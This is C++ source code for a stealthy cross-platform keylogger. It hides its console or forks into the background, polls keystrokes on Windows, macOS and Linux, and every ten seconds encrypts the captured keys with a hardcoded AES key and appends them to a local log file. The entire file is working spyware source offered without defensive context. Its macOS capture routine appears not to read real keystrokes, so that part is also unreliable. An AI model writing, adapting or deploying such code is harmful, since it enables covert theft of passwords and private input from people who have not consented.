#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <cstdlib>
#include <openssl/aes.h>
#include <openssl/rand.h>

#ifdef _WIN32
#include <Windows.h>
#elif __APPLE__
#include <ApplicationServices/ApplicationServices.h>
#include <CoreFoundation/CoreFoundation.h>
#include <unistd.h>
#elif __linux__
#include <X11/Xlib.h>
#include <X11/XKBlib.h>
#include <X11/keysym.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#endif

// ** Global Variables **
std::mutex dataMutex;
std::string capturedData;

// ** AES Encryption **
class AESHandler {
public:
    AESHandler(const std::string& key) {
        if (key.size() != AES_BLOCK_SIZE) {
            throw std::runtime_error("Key must be 16 bytes.");
        }
        std::copy(key.begin(), key.end(), encryptionKey);
    }

    std::string encrypt(const std::string& data) {
        unsigned char iv[AES_BLOCK_SIZE];
        if (!RAND_bytes(iv, AES_BLOCK_SIZE)) {
            throw std::runtime_error("Failed to generate IV.");
        }

        std::string encrypted(data.size() + AES_BLOCK_SIZE, '\0');
        AES_KEY aesKey;
        AES_set_encrypt_key(encryptionKey, 128, &aesKey);

        AES_cfb128_encrypt(
            reinterpret_cast<const unsigned char*>(data.c_str()),
            reinterpret_cast<unsigned char*>(&encrypted[0]),
            data.size(),
            &aesKey,
            iv,
            &num,
            AES_ENCRYPT
        );

        return std::string(reinterpret_cast<char*>(iv), AES_BLOCK_SIZE) + encrypted;
    }

private:
    unsigned char encryptionKey[AES_BLOCK_SIZE];
    int num = 0;
};

// ** Stealth Mode **
void activateStealthMode() {
#ifdef _WIN32
    ShowWindow(GetConsoleWindow(), SW_HIDE);
#elif __APPLE__ || __linux__
    if (fork() != 0) exit(0); // Run in the background
#endif
}

// ** Get User Home Directory **
std::string getUserHomeDirectory() {
#ifdef _WIN32
    char* homePath;
    size_t len;
    _dupenv_s(&homePath, &len, "USERPROFILE");
    std::string homeDir(homePath);
    free(homePath);
    return homeDir;
#elif __APPLE__ || __linux__
    const char* homePath = getenv("HOME");
    if (!homePath) {
        homePath = getpwuid(getuid())->pw_dir;
    }
    return std::string(homePath);
#endif
}

// ** Keyboard Listener **
#ifdef _WIN32
void keyboardListener() {
    while (true) {
        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                std::lock_guard<std::mutex> lock(dataMutex);
                if (i >= 32 && i <= 126) {
                    capturedData += static_cast<char>(i);
                } else {
                    capturedData += "[" + std::to_string(i) + "]";
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}
#elif __APPLE__
void keyboardListener() {
    CGEventSourceRef source = CGEventSourceCreate(kCGEventSourceStateHIDSystemState);
    while (true) {
        CGEventRef event = CGEventCreateKeyboardEvent(source, 0, true);
        UniChar key;
        CGEventKeyboardGetUnicodeString(event, 1, nullptr, &key);
        std::lock_guard<std::mutex> lock(dataMutex);
        if (key >= 32 && key <= 126) {
            capturedData += static_cast<char>(key);
        }
        CFRelease(event);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}
#elif __linux__
void keyboardListener() {
    Display* display = XOpenDisplay(nullptr);
    if (!display) {
        throw std::runtime_error("Cannot open X11 display.");
    }

    char keys[32];
    while (true) {
        XQueryKeymap(display, keys);
        for (int i = 0; i < 256; i++) {
            if (keys[i / 8] & (1 << (i % 8))) {
                std::lock_guard<std::mutex> lock(dataMutex);
                capturedData += "[" + std::to_string(i) + "]";
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }

    XCloseDisplay(display);
}
#endif

// ** Cursor Position Tracking **
std::string getCursorPosition() {
#ifdef _WIN32
    POINT cursorPos;
    if (GetCursorPos(&cursorPos)) {
        return "Cursor: (" + std::to_string(cursorPos.x) + ", " + std::to_string(cursorPos.y) + ")";
    }
#elif __APPLE__
    CGEventRef event = CGEventCreate(nullptr);
    CGPoint point = CGEventGetLocation(event);
    CFRelease(event);
    return "Cursor: (" + std::to_string((int)point.x) + ", " + std::to_string((int)point.y) + ")";
#elif __linux__
    Display* display = XOpenDisplay(nullptr);
    if (!display) {
        return "Cursor: (Unknown)";
    }

    Window root, child;
    int rootX, rootY, winX, winY;
    unsigned int mask;
    if (XQueryPointer(display, DefaultRootWindow(display), &root, &child, &rootX, &rootY, &winX, &winY, &mask)) {
        XCloseDisplay(display);
        return "Cursor: (" + std::to_string(rootX) + ", " + std::to_string(rootY) + ")";
    }
    XCloseDisplay(display);
#endif
    return "Cursor: (Unknown)";
}

// ** Save to File **
void saveToFile(const std::string& filename, const std::string& data) {
    std::ofstream outfile(filename, std::ios_base::app);
    if (!outfile) {
        throw std::runtime_error("Cannot open file for writing.");
    }
    outfile << data;
}

// ** Main Function **
int main() {
    try {
        activateStealthMode();
        AESHandler aesHandler("1234567890123456"); // 16-byte AES key

        std::thread keyloggerThread(keyboardListener);

        while (true) {
            std::this_thread::sleep_for(std::chrono::seconds(10));

            std::lock_guard<std::mutex> lock(dataMutex);
            if (!capturedData.empty()) {
                std::string encrypted = aesHandler.encrypt(capturedData);
                saveToFile("output.log", encrypted);
                capturedData.clear();
            }
        }

        keyloggerThread.join();
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}